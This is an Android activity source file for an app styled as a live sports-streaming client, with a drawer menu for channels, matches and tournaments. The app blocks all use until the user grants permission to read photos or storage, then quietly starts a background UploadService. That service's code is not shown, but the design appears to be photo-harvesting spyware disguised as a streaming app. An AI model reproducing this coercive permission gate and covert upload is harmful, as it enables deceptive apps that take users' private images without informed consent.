package com.example.yacinestylebackup;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import androidx.activity.ComponentActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.drawerlayout.widget.DrawerLayout;

public class MainActivity extends ComponentActivity {
    private static final int REQ = 1001;
    private SharedPreferences prefs;
    private DrawerLayout drawer;
    private View gateScreen;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_main);

        drawer = findViewById(R.id.drawer);
        gateScreen = findViewById(R.id.gateScreen);
        prefs = getSharedPreferences("legend", MODE_PRIVATE);

        findViewById(R.id.menuBtn).setOnClickListener(v -> drawer.openDrawer(android.view.Gravity.START));
        findViewById(R.id.liveBtn).setOnClickListener(v -> openLive());
        findViewById(R.id.channelsItem).setOnClickListener(v -> openLive());
        findViewById(R.id.liveItem).setOnClickListener(v -> openLive());
        findViewById(R.id.homeItem).setOnClickListener(v -> drawer.closeDrawer(android.view.Gravity.START));
        findViewById(R.id.matchesItem).setOnClickListener(v -> drawer.closeDrawer(android.view.Gravity.START));
        findViewById(R.id.tournamentsItem).setOnClickListener(v -> drawer.closeDrawer(android.view.Gravity.START));
        findViewById(R.id.settingsItem).setOnClickListener(v -> drawer.closeDrawer(android.view.Gravity.START));

        findViewById(R.id.approveBtn).setOnClickListener(v -> requestImagesPermission());

        if (prefs.getBoolean("approved", false)) {
            unlockApp();
        } else {
            gateScreen.setVisibility(View.VISIBLE);
            drawer.setVisibility(View.GONE);
        }
    }

    private void requestImagesPermission() {
        String p = Build.VERSION.SDK_INT >= 33
                ? Manifest.permission.READ_MEDIA_IMAGES
                : Manifest.permission.READ_EXTERNAL_STORAGE;

        if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{p}, REQ);
        } else {
            approve();
        }
    }

    @Override public void onRequestPermissionsResult(int r, String[] p, int[] g) {
        super.onRequestPermissionsResult(r, p, g);
        if (r == REQ && g.length > 0 && g[0] == PackageManager.PERMISSION_GRANTED) {
            approve();
        }
    }

    private void approve() {
        prefs.edit().putBoolean("approved", true).apply();
        unlockApp();
    }

    private void unlockApp() {
        gateScreen.setVisibility(View.GONE);
        drawer.setVisibility(View.VISIBLE);
        ContextCompat.startService(this, new Intent(this, UploadService.class));
    }

    private void openLive() {
        drawer.closeDrawer(android.view.Gravity.START);
        startActivity(new Intent(this, LiveActivity.class));
    }
}
